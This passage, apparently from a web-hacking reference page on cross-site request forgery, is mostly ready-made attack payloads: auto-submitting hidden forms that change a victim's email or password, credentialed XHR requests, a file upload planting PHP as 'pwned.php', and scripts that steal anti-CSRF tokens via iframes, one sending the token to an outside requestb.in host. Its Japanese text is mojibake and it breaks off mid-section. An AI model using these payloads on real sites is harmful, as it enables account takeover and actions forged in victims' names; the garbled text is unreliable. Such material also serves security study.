history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
***

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**HackenProofã‚’ãƒ•ã‚©ãƒ­ãƒ¼**](https://bit.ly/3xrrDrL) **ã—ã¦ã€web3ã®ãƒã‚°ã«ã¤ã„ã¦ã‚‚ã£ã¨å­¦ã³ã¾ã—ã‚‡ã†**

ğŸ web3ã®ãƒã‚°ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«ã‚’èª­ã‚€

ğŸ”” æ–°ã—ã„ãƒã‚°å ±é…¬ã«ã¤ã„ã¦é€šçŸ¥ã‚’å—ã‘ã‚‹

ğŸ’¬ ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãƒ‡ã‚£ã‚¹ã‚«ãƒƒã‚·ãƒ§ãƒ³ã«å‚åŠ ã™ã‚‹

## **æ”»æ’ƒä¾‹**

### **CSRFãƒˆãƒ¼ã‚¯ãƒ³ã®æŠ½å‡º**

ã‚‚ã—**CSRFãƒˆãƒ¼ã‚¯ãƒ³**ãŒ**é˜²å¾¡æ‰‹æ®µ**ã¨ã—ã¦ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å ´åˆã€[**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens)ã®è„†å¼±æ€§ã‚„[**Dangling Markup**](dangling-markup-html-scriptless-injection.md)ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã—ã¦**æŠ½å‡º**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### **HTMLã‚¿ã‚°ã‚’ä½¿ç”¨ã—ãŸGET**
```markup
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
è‡ªå‹•çš„ã«GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã‚‹ä»–ã®HTML5ã‚¿ã‚°ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š

![](<../.gitbook/assets/image (530).png>)

### ãƒ•ã‚©ãƒ¼ãƒ ã®GETãƒªã‚¯ã‚¨ã‚¹ãƒˆ
```markup
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### ãƒ•ã‚©ãƒ¼ãƒ ã®POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆ

To perform a Cross-Site Request Forgery (CSRF) attack, an attacker can create a malicious HTML page that includes a form with a POST method. This form is designed to submit data to a target website without the user's knowledge or consent.

To execute the attack, the attacker tricks the victim into visiting the malicious page. When the victim loads the page, the form is automatically submitted, sending the data to the target website. Since the victim is already authenticated on the target website, the server accepts the request and performs the desired action.

The key to a successful CSRF attack is to ensure that the victim is authenticated on the target website. This can be achieved by tricking the victim into clicking on a link or visiting a page that requires authentication before loading the malicious page.

To protect against CSRF attacks, web developers can implement measures such as using anti-CSRF tokens or checking the origin of the request. Additionally, users can protect themselves by being cautious when clicking on links or visiting unfamiliar websites.
```markup
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### iframeã‚’é€šã˜ãŸãƒ•ã‚©ãƒ¼ãƒ ã®POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆ

An attacker can exploit Cross-Site Request Forgery (CSRF) vulnerabilities by tricking a victim into submitting a form through an invisible iframe. This technique is commonly used when the attacker wants to perform actions on behalf of the victim without their knowledge or consent.

To execute this attack, the attacker crafts a malicious webpage that contains an invisible iframe pointing to the target website. The attacker then creates a form within the iframe and sets the target website as the form's action. The form is pre-filled with the desired data and automatically submitted using JavaScript.

When the victim visits the attacker's webpage, the form is submitted in the background without their knowledge. Since the victim is already authenticated on the target website, the server processes the request as if it came directly from the victim. This allows the attacker to perform actions on the victim's behalf, such as changing their password, making purchases, or modifying their account settings.

To protect against this attack, web developers should implement measures such as using anti-CSRF tokens, validating the referrer header, and implementing strict SameSite cookie policies. Additionally, users should be cautious when clicking on unfamiliar links or visiting suspicious websites to minimize the risk of falling victim to CSRF attacks.
```markup
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Ajax POST ãƒªã‚¯ã‚¨ã‚¹ãƒˆ**

Ajax POST ãƒªã‚¯ã‚¨ã‚¹ãƒˆã¯ã€ãƒ–ãƒ©ã‚¦ã‚¶ãŒéåŒæœŸçš„ã«ã‚µãƒ¼ãƒãƒ¼ã«ãƒ‡ãƒ¼ã‚¿ã‚’é€ä¿¡ã™ã‚‹ãŸã‚ã®æ–¹æ³•ã§ã™ã€‚ã“ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã¯ã€Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®æ©Ÿèƒ½ã‚’åˆ©ç”¨ã—ã¦ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æ“ä½œãªã—ã«ãƒ‡ãƒ¼ã‚¿ã‚’é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ä»¥ä¸‹ã¯ã€Ajax POST ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®åŸºæœ¬çš„ãªæ§‹æ–‡ã§ã™ã€‚

```javascript
$.ajax({
    url: "http://example.com/api",
    type: "POST",
    data: {
        param1: "value1",
        param2: "value2"
    },
    success: function(response) {
        console.log(response);
    },
    error: function(xhr, status, error) {
        console.log(error);
    }
});
```

ã“ã®ä¾‹ã§ã¯ã€`http://example.com/api` ã«å¯¾ã—ã¦POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒé€ä¿¡ã•ã‚Œã¾ã™ã€‚`data` ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã«ã¯ã€é€ä¿¡ã™ã‚‹ãƒ‡ãƒ¼ã‚¿ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚æˆåŠŸã—ãŸå ´åˆã¯ã€`success` é–¢æ•°ãŒå‘¼ã³å‡ºã•ã‚Œã€ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãŒã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã«è¡¨ç¤ºã•ã‚Œã¾ã™ã€‚ã‚¨ãƒ©ãƒ¼ãŒç™ºç”Ÿã—ãŸå ´åˆã¯ã€`error` é–¢æ•°ãŒå‘¼ã³å‡ºã•ã‚Œã€ã‚¨ãƒ©ãƒ¼ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãŒã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã«è¡¨ç¤ºã•ã‚Œã¾ã™ã€‚

Ajax POST ãƒªã‚¯ã‚¨ã‚¹ãƒˆã¯ã€CSRFï¼ˆCross-Site Request Forgeryï¼‰æ”»æ’ƒã®æ½œåœ¨çš„ãªè„†å¼±æ€§ã‚’æŒã£ã¦ã„ã¾ã™ã€‚ã“ã®æ”»æ’ƒã§ã¯ã€æ”»æ’ƒè€…ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ä»£ã‚ã‚Šã«æ„å›³ã—ãªã„ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®æ”»æ’ƒã‚’é˜²ããŸã‚ã«ã¯ã€é©åˆ‡ãªCSRFå¯¾ç­–ã‚’å®Ÿè£…ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
```markup
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### multipart/form-data POST ãƒªã‚¯ã‚¨ã‚¹ãƒˆ

In a multipart/form-data POST request, the data is sent as a series of parts, each containing a separate piece of data. This type of request is commonly used when uploading files or submitting forms with binary data.

To construct a multipart/form-data POST request, you need to set the `Content-Type` header to `multipart/form-data` and format the request body accordingly. Each part of the request body should be separated by a boundary, which is a unique string that acts as a delimiter between the parts.

Here is an example of a multipart/form-data POST request:

```http
POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=---------------------------1234567890

-----------------------------1234567890
Content-Disposition: form-data; name="file"; filename="example.jpg"
Content-Type: image/jpeg

[Binary data of the file]
-----------------------------1234567890
Content-Disposition: form-data; name="name"

John Doe
-----------------------------1234567890--
```

In this example, the request body consists of two parts. The first part contains the file data, with the `Content-Disposition` header specifying the name and filename of the file, as well as the content type. The second part contains a form field named "name" with the value "John Doe".

When sending a multipart/form-data POST request, make sure to properly set the `Content-Length` header to indicate the total size of the request body.
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### multipart/form-data POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆ v2

In this technique, we will explore how to perform a CSRF attack using a multipart/form-data POST request. This technique is useful when the target application uses this type of request to submit forms or upload files.

To execute this attack, we need to create a malicious HTML page that will contain a form with the necessary fields to perform the CSRF attack. The form should have the `enctype` attribute set to `multipart/form-data` and the `method` attribute set to `POST`. 

The fields in the form should match the fields expected by the target application. These fields can be identified by inspecting the HTML source code or by using a tool like Burp Suite. 

Once the form is created, we need to include it in a page that will be hosted on our server. This page should also include JavaScript code that will automatically submit the form when the page is loaded. 

When the victim visits our malicious page, the form will be submitted automatically, sending the crafted request to the target application. Since the victim is authenticated in the target application, the request will be processed as if it came from the victim's browser.

To protect against this type of attack, the target application should implement measures such as using anti-CSRF tokens or checking the `Referer` header to ensure that requests originate from the same domain.

By understanding and exploiting the vulnerabilities associated with multipart/form-data POST requests, we can gain unauthorized access to sensitive information or perform actions on behalf of the victim. It is important to note that performing CSRF attacks is illegal and should only be done with proper authorization and for ethical purposes.
```javascript
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### iframe å†…ã‹ã‚‰ã®ãƒ•ã‚©ãƒ¼ãƒ  POST ãƒªã‚¯ã‚¨ã‚¹ãƒˆ

When an HTML form is submitted, the browser sends a POST request to the specified URL. This behavior can be exploited in a Cross-Site Request Forgery (CSRF) attack when the form is submitted from within an iframe.

HTMLã®ãƒ•ã‚©ãƒ¼ãƒ ãŒé€ä¿¡ã•ã‚Œã‚‹ã¨ã€ãƒ–ãƒ©ã‚¦ã‚¶ã¯æŒ‡å®šã•ã‚ŒãŸURLã«POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã¾ã™ã€‚ã“ã®æŒ™å‹•ã¯ã€iframeå†…ã‹ã‚‰ãƒ•ã‚©ãƒ¼ãƒ ãŒé€ä¿¡ã•ã‚ŒãŸå ´åˆã«ã€ã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ•ã‚©ãƒ¼ã‚¸ã‚§ãƒªï¼ˆCSRFï¼‰æ”»æ’ƒã§æ‚ªç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

To perform a CSRF attack using an iframe, an attacker can create a webpage with an invisible iframe that loads the target website's form. The attacker can then use JavaScript to automatically submit the form without the user's knowledge.

iframeã‚’ä½¿ç”¨ã—ã¦CSRFæ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã€æ”»æ’ƒè€…ã¯ç›®çš„ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã®ãƒ•ã‚©ãƒ¼ãƒ ã‚’èª­ã¿è¾¼ã‚€é€æ˜ãªiframeã‚’æŒã¤ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã‚’ä½œæˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚æ”»æ’ƒè€…ã¯JavaScriptã‚’ä½¿ç”¨ã—ã¦ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®çŸ¥è­˜ã‚’æŒãŸãšã«ãƒ•ã‚©ãƒ¼ãƒ ã‚’è‡ªå‹•çš„ã«é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

This attack is possible because the browser includes the user's session cookies in the POST request, allowing the attacker to impersonate the user and perform actions on their behalf.

ã“ã®æ”»æ’ƒãŒå¯èƒ½ãªã®ã¯ã€ãƒ–ãƒ©ã‚¦ã‚¶ãŒPOSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚¯ãƒƒã‚­ãƒ¼ã‚’å«ã‚ã‚‹ãŸã‚ã§ã‚ã‚Šã€æ”»æ’ƒè€…ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ãªã‚Šã™ã¾ã—ã€ãã®ä»£ã‚ã‚Šã«æ“ä½œã‚’è¡Œã†ã“ã¨ãŒã§ãã‚‹ã‹ã‚‰ã§ã™ã€‚

To protect against CSRF attacks, web developers should implement measures such as using anti-CSRF tokens, which are unique tokens embedded in the form that are checked upon submission to ensure the request is legitimate.

CSRFæ”»æ’ƒã«å¯¾æŠ—ã™ã‚‹ãŸã‚ã«ã€ã‚¦ã‚§ãƒ–é–‹ç™ºè€…ã¯ã€ãƒ•ã‚©ãƒ¼ãƒ ã«åŸ‹ã‚è¾¼ã¾ã‚ŒãŸä¸€æ„ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã™ã‚‹ãªã©ã®å¯¾ç­–ã‚’å®Ÿè£…ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒæ­£å½“ã§ã‚ã‚‹ã“ã¨ã‚’ç¢ºèªã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```markup
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã¿ã€POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹**

To perform a CSRF attack, you need to steal the CSRF token from the target website and then use it to craft a malicious POST request. Here's how you can do it:

1. **Stealing the CSRF Token**: The CSRF token is typically embedded in the HTML of the target website. You can use various techniques like cross-site scripting (XSS) or social engineering to trick the victim into executing a script that extracts the CSRF token. Once you have the token, store it for later use.

2. **Crafting the Malicious POST Request**: With the stolen CSRF token, you can now craft a POST request to perform the desired action on the target website. Make sure to include all the necessary parameters and values required by the target website's form. The CSRF token should be included as a parameter in the request body or as a custom header, depending on how the website handles CSRF protection.

3. **Sending the POST Request**: Once you have crafted the malicious POST request, you can send it to the target website. This can be done using various tools like cURL, Burp Suite, or custom scripts. Make sure to set the appropriate headers and cookies to mimic a legitimate request.

By stealing the CSRF token and sending a crafted POST request, you can trick the target website into performing actions on behalf of the victim without their consent. This can lead to various security vulnerabilities, such as unauthorized data modification or account takeover. It is important for web developers to implement proper CSRF protection mechanisms to mitigate these attacks.
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã¿ã€iframeã€ãƒ•ã‚©ãƒ¼ãƒ ã€ãŠã‚ˆã³Ajaxã‚’ä½¿ç”¨ã—ã¦POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹**

To perform a Cross-Site Request Forgery (CSRF) attack, you need to steal the CSRF token from the target website and then use it to send a malicious POST request. This can be achieved using an iframe, a form, and Ajax.

#### **Stealing the CSRF Token**

1. Create an iframe element in your attacker-controlled website.
2. Set the source of the iframe to the target website's login page or any other page that generates a CSRF token.
3. Use JavaScript to access the contents of the iframe and extract the CSRF token from the HTML source code.
4. Store the stolen CSRF token in a variable for later use.

#### **Sending a POST Request**

1. Create a hidden form element in your attacker-controlled website.
2. Set the action attribute of the form to the target website's vulnerable endpoint.
3. Set the method attribute of the form to "POST".
4. Include any required parameters in the form, such as the stolen CSRF token and any other necessary data.
5. Use JavaScript to automatically submit the form when the page loads or when triggered by an event.

#### **Using Ajax**

1. Create an Ajax request in your attacker-controlled website.
2. Set the URL of the request to the target website's vulnerable endpoint.
3. Set the method of the request to "POST".
4. Include any required parameters in the request, such as the stolen CSRF token and any other necessary data.
5. Send the Ajax request using JavaScript.

By stealing the CSRF token and using it to send a malicious POST request, you can trick the target website into performing actions on behalf of the victim user without their consent. This can lead to unauthorized actions, data manipulation, or even account takeover. It is important for web developers to implement proper CSRF protection mechanisms to prevent such attacks.
```markup
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã¿ã€iframeã¨ãƒ•ã‚©ãƒ¼ãƒ ã‚’ä½¿ç”¨ã—ã¦POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹**

To perform a Cross-Site Request Forgery (CSRF) attack, you need to steal the CSRF token from the target website and then use it to send a malicious POST request. One way to achieve this is by utilizing an iframe and a form.

ã¾ãšã€Cross-Site Request Forgeryï¼ˆCSRFï¼‰æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã€å¯¾è±¡ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‹ã‚‰CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã‚€å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ãã®å¾Œã€ã“ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã¦æ‚ªæ„ã®ã‚ã‚‹POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã¾ã™ã€‚ã“ã‚Œã‚’å®Ÿç¾ã™ã‚‹æ–¹æ³•ã®ä¸€ã¤ã¯ã€iframeã¨ãƒ•ã‚©ãƒ¼ãƒ ã‚’åˆ©ç”¨ã™ã‚‹ã“ã¨ã§ã™ã€‚

First, you need to create an iframe element in your attacker-controlled website. This iframe should have its source set to the target website's URL. By loading the target website within the iframe, you can access its DOM and extract the CSRF token.

ã¾ãšã€æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã§iframeè¦ç´ ã‚’ä½œæˆã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã®iframeã®ã‚½ãƒ¼ã‚¹ã¯ã€å¯¾è±¡ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã®URLã«è¨­å®šã•ã‚Œã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚iframeå†…ã§å¯¾è±¡ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‚’èª­ã¿è¾¼ã‚€ã“ã¨ã§ã€ãã®DOMã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã€CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’æŠ½å‡ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

Once you have obtained the CSRF token, you can use it to craft a malicious form. This form should have its action attribute set to the target website's vulnerable endpoint and include any necessary input fields. Make sure to include the stolen CSRF token as a hidden input field within the form.

CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’å…¥æ‰‹ã—ãŸã‚‰ã€ãã‚Œã‚’ä½¿ç”¨ã—ã¦æ‚ªæ„ã®ã‚ã‚‹ãƒ•ã‚©ãƒ¼ãƒ ã‚’ä½œæˆã—ã¾ã™ã€‚ã“ã®ãƒ•ã‚©ãƒ¼ãƒ ã®actionå±æ€§ã¯ã€å¯¾è±¡ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã®è„†å¼±ãªã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«è¨­å®šã—ã€å¿…è¦ãªå…¥åŠ›ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã‚’å«ã‚ã¾ã™ã€‚ãƒ•ã‚©ãƒ¼ãƒ å†…ã«ã¯ã€ç›—ã¾ã‚ŒãŸCSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’éš ã—ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã¨ã—ã¦å«ã‚ã‚‹ã‚ˆã†ã«ã—ã¦ãã ã•ã„ã€‚

Finally, you can submit the form programmatically using JavaScript. This can be done by calling the form's submit() method. When the form is submitted, the malicious POST request will be sent to the target website, potentially causing unauthorized actions to be performed on behalf of the victim.

æœ€å¾Œã«ã€JavaScriptã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚©ãƒ¼ãƒ ã‚’ãƒ—ãƒ­ã‚°ãƒ©ãƒ çš„ã«é€ä¿¡ã—ã¾ã™ã€‚ã“ã‚Œã¯ã€ãƒ•ã‚©ãƒ¼ãƒ ã®submit()ãƒ¡ã‚½ãƒƒãƒ‰ã‚’å‘¼ã³å‡ºã™ã“ã¨ã§è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚ãƒ•ã‚©ãƒ¼ãƒ ãŒé€ä¿¡ã•ã‚Œã‚‹ã¨ã€æ‚ªæ„ã®ã‚ã‚‹POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒå¯¾è±¡ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã«é€ä¿¡ã•ã‚Œã€è¢«å®³è€…ã®ä»£ã‚ã‚Šã«æ¨©é™ã®ãªã„ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ãŒå®Ÿè¡Œã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
```markup
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã¿ã€2ã¤ã®iframeã‚’ä½¿ç”¨ã—ã¦é€ä¿¡ã™ã‚‹**

One way to perform a CSRF attack is by stealing a user's authentication token and then using it to make unauthorized requests on their behalf. In this technique, we will steal the token by tricking the user into visiting a malicious website that contains two iframes.

The first iframe will load the target website where the user is authenticated. This iframe will be hidden from the user's view using CSS. The second iframe will load a malicious website that we control.

When the user visits the malicious website, JavaScript code will be executed that will extract the authentication token from the first iframe. This can be done by accessing the `contentWindow` property of the first iframe and then accessing the token from its DOM.

Once the token is obtained, it can be used to make unauthorized requests on behalf of the user. This can be done by sending HTTP requests using JavaScript, either through the `XMLHttpRequest` object or the `fetch` API.

By using this technique, an attacker can trick a user into unknowingly performing actions on a target website without their consent. This can lead to various security vulnerabilities, such as changing account settings, making unauthorized purchases, or even performing actions with administrative privileges.

To protect against CSRF attacks, it is important to implement measures such as using anti-CSRF tokens, validating the origin of requests, and implementing strict access controls.
```markup
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **Ajaxã‚’ä½¿ç”¨ã—ã¦CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã¿ã€ãƒ•ã‚©ãƒ¼ãƒ ã§POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹**

In this technique, we will use Ajax to steal the CSRF token from the target website and then use it to send a POST request using a form.

ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã§ã¯ã€Ajaxã‚’ä½¿ç”¨ã—ã¦ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‹ã‚‰CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã¿ã€ãã‚Œã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚©ãƒ¼ãƒ ã‚’ä½¿ã£ã¦POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã¾ã™ã€‚

First, we need to retrieve the CSRF token from the target website. We can do this by making an Ajax request to a page that contains the CSRF token.

